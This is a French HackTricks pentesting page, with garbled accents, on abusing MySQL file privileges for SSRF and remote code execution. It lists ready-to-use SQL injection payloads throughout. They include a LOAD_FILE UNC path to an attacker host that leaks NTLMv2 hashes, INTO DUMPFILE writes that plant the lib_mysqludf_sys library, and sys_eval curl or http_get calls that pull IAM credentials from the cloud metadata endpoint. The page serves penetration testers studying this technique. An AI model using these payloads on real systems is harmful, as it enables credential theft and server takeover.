# MySQL File priv to SSRF/RCE

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### LOAD\_FILE/LOAD DATA/LOAD XML vers SSRF

Chaque article d'exfiltration de donn√©es SQL Out of Band utilisera la fonction de cha√Æne `LOAD_FILE()` pour effectuer une requ√™te r√©seau. La fonction elle-m√™me a ses propres limitations en fonction du syst√®me d'exploitation sur lequel elle est ex√©cut√©e et des param√®tres avec lesquels la base de donn√©es a √©t√© d√©marr√©e.

Par exemple, si la variable globale `secure_file_priv` n'a pas √©t√© d√©finie, [la valeur par d√©faut est d√©finie sur `/var/lib/mysql-files/`](https://dev.mysql.com/doc/mysql-installation-excerpt/5.7/en/linux-installation-rpm.html), ce qui signifie que vous ne pouvez utiliser que des fonctions telles que `LOAD_FILE('nom_fichier')` ou `LOAD DATA [LOCAL] INFILE 'nom_fichier' INTO TABLE nom_table` pour lire des fichiers du r√©pertoire `/var/lib/mysql-files/`. Pour pouvoir effectuer des lectures sur des fichiers en dehors de ce r√©pertoire, l'option `secure_file_priv` doit √™tre d√©finie sur `""`, ce qui ne peut √™tre fait qu'en mettant √† jour le fichier de configuration de la base de donn√©es ou en passant le param√®tre de d√©marrage `--secure_file_priv=""` au service de base de donn√©es.

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/2.png)

N√©anmoins, dans les circonstances o√π `secure_file_priv` est d√©fini sur `""`, nous devrions pouvoir lire d'autres fichiers sur le syst√®me, en supposant que les autorisations de lecture de fichier et `file_priv` sont d√©finies sur `Y` dans `mysql.user` pour l'utilisateur de la base de donn√©es actuel. Cependant, la possibilit√© d'utiliser ces fonctions pour effectuer des appels r√©seau d√©pend beaucoup du syst√®me d'exploitation. Comme ces fonctions sont con√ßues uniquement pour lire des fichiers, les seuls appels r√©seau pertinents qui peuvent √™tre effectu√©s sont vers des chemins UNC sur des h√¥tes Windows, car [l'API Windows `CreateFileA` appel√©e lors de l'acc√®s √† un fichier comprend les conventions de d√©nomination UNC](https://docs.microsoft.com/en-gb/windows/win32/fileio/naming-a-file).

Ainsi, si votre base de donn√©es cible s'ex√©cute sur une machine Windows, la requ√™te d'injection `x'; SELECT LOAD_FILE('\\\\attackerserver.example.com\\a.txt'); -- //` [entra√Ænerait l'envoi par la machine Windows des hachages NTLMv2 dans une tentative d'authentification avec le `\\attackerserver.example.com` contr√¥l√© par l'attaquant](https://packetstormsecurity.com/files/140832/MySQL-OOB-Hacking.html).

Cette falsification de requ√™te c√¥t√© serveur, bien qu'utile, est limit√©e au seul port TCP 445. Vous ne pouvez pas contr√¥ler le num√©ro de port, mais vous pouvez lire des informations √† partir de partages configur√©s avec des privil√®ges de lecture complets. De plus, comme l'ont montr√© des recherches plus anciennes, vous pouvez utiliser cette capacit√© SSRF limit√©e pour voler des hachages et les relayer pour obtenir des shells, donc c'est certainement utile.

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/3.png)

### Fonctions d√©finies par l'utilisateur vers RCE

Une autre technique int√©ressante avec les bases de donn√©es MySQL est la possibilit√© d'utiliser des fonctions d√©finies par l'utilisateur (UDF) pr√©sentes dans des fichiers de biblioth√®que externes qui, s'ils sont pr√©sents dans des emplacements sp√©cifiques ou dans le $PATH syst√®me, peuvent √™tre accessibles depuis MySQL.

Vous pouvez utiliser une injection SQL pour **√©crire une biblioth√®que (`.so` ou `.dll`** selon Linux ou Windows), contenant une fonction d√©finie par l'utilisateur qui peut effectuer des requ√™tes r√©seau/HTTP, qui peuvent ensuite √™tre invoqu√©es par le biais de requ√™tes suppl√©mentaires.

Cela a ses propres restrictions. En fonction de la version de MySQL, que vous pouvez identifier avec `select @@version`, le r√©pertoire √† partir duquel les plugins peuvent √™tre charg√©s est restreint. MySQL inf√©rieur √† `v5.0.67` permettait le chargement de fichiers de biblioth√®que √† partir du chemin syst√®me si la variable `plugin_dir` n'√©tait pas d√©finie. Cela a maintenant chang√© et les nouvelles versions ont la variable **`plugin_dir`** d√©finie sur quelque chose comme `/usr/lib/mysql/plugin/`, qui est g√©n√©ralement d√©tenu par root.

Fondamentalement, **pour charger une biblioth√®que personnalis√©e dans MySQL et appeler une fonction de la biblioth√®que charg√©e via une injection SQL, vous auriez besoin de** :

* la possibilit√© d'**√©crire dans l'emplacement** sp√©cifi√© dans **`@@plugin_dir`** via une injection SQL
* **`file_priv`** d√©fini sur **`Y`** dans `mysql.user` pour l'utilisateur de la base de donn√©es actuel
* **`secure_file_priv`** d√©fini sur **`""`** afin de pouvoir lire les octets bruts de la biblioth√®que √† partir d'un emplacement arbitraire comme le r√©seau ou un r√©pertoire de t√©l√©chargement de fichiers dans une application web.

En supposant que les conditions ci-dessus sont remplies, vous pouvez utiliser l'approche **classique de transfert de la** [**biblioth√®que UDF MySQL populaire `lib_mysqludf_sys`**](https://github.com/mysqludf/lib\_mysqludf\_sys) **vers le serveur de base de donn√©es**. Vous pourriez ensuite effectuer des requ√™tes de commandes syst√®me comme `cURL` ou `powershell wget` pour effectuer une SSRF en utilisant la syntaxe suivante :

`x'; SELECT sys_eval('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

Il existe de nombreuses autres fonctions d√©clar√©es dans cette biblioth√®que, une analyse desquelles peut √™tre consult√©e [ici](https://osandamalith.com/2018/02/11/mysql-udf-exploitation/). Si vous √™tes paresseux comme moi, vous pouvez obtenir une copie de cette biblioth√®que UDF, pour le syst√®me d'exploitation cible, √† partir d'une installation Metasploit du r√©pertoire `/usr/share/metasploit-framework/data/exploits/mysql/` et vous lancer.

Alternativement, des biblioth√®ques UDF ont √©t√© cr√©√©es sp√©cifiquement pour permettre √† la base de donn√©es d'effectuer des requ√™tes HTTP. Vous pouvez utiliser [MySQL User-defined function (UDF) for HTTP GET/POST](https://github.com/y-ken/mysql-udf-http) pour permettre √† la base de donn√©es d'effectuer des requ√™tes HTTP, en utilisant la syntaxe suivante :

`x'; SELECT http_get('http://169.254.169.254/latest/meta-data/iam/security-credentials/'); -- //`

Vous pouvez √©galement [cr√©er votre propre UDF et l'utiliser √©galement pour l'exploitation post√©rieure.](
Dans tous les cas, vous devez transf√©rer la biblioth√®que vers le serveur de base de donn√©es. Vous pouvez le faire de plusieurs mani√®res :

1. Utilisez la fonction de cha√Æne MySQL `hex()` ou quelque chose comme `xxd -p filename.so | tr -d '\n'` pour convertir le contenu de la biblioth√®que en format hexad√©cimal, puis le d√©poser dans le r√©pertoire `@@plugin_dir` en utilisant `x'; SELECT unhex(0x1234abcd12abcdef1223.....) into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`
2. Alternativement, convertissez le contenu de `filename.so` en base64 et utilisez `x';select from_base64("AAAABB....") into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so' -- //`

Si le r√©pertoire `@@plugin_dir` n'est pas accessible en √©criture, vous √™tes malchanceux si la version est sup√©rieure √† `v5.0.67`. Sinon, √©crivez dans un emplacement diff√©rent qui est dans le chemin et chargez la biblioth√®que UDF √† partir de l√† en utilisant :

* pour la biblioth√®que `lib_mysqludf_sys` - `x';create function sys_eval returns string soname 'lib_mysqludf_sys.so'; -- //`
* pour la biblioth√®que `mysql-udf-http` - `x';create function http_get returns string soname 'mysql-udf-http.so'; -- //`

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/4.png)

![](https://ibreak.software/img/using-sql-injection-to-perform-ssrf-xspa-attacks/5.png)

Pour automatiser cela, vous pouvez utiliser SQLMap qui prend en charge [l'utilisation de UDF personnalis√©es via l'option `--udf-inject`](https://github.com/sqlmapproject/sqlmap/wiki/Usage).

Pour les injections SQL aveugles, vous pouvez rediriger la sortie des fonctions UDF vers une table temporaire, puis lire les donn√©es √† partir de l√† ou utiliser [une requ√™te DNS dissimul√©e dans une commande curl `sys_eval` ou `sys_exec`](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration).

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
